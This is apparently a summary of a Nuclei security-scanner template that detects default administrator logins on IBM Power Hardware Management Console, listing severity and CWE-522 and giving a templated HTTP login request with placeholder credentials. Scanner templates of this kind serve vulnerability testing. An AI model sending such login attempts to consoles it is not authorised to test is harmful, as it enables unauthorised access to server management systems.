# Nuclei Template: IBM Power HMC - Default Login
**Template ID:** ibm-hmc-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`ibm-hmc-default-login.yaml`)

## Vulnerability Information & PoC

## Description
IBM HMC default admin login credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /hmc/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

j_username={{username}}&j_password={{password}}&j_newConsole=Dashboard&j_security_check=Log+in
```

## References
- https://www.ibm.com/docs/en/power8?topic=tools-hardware-management-console
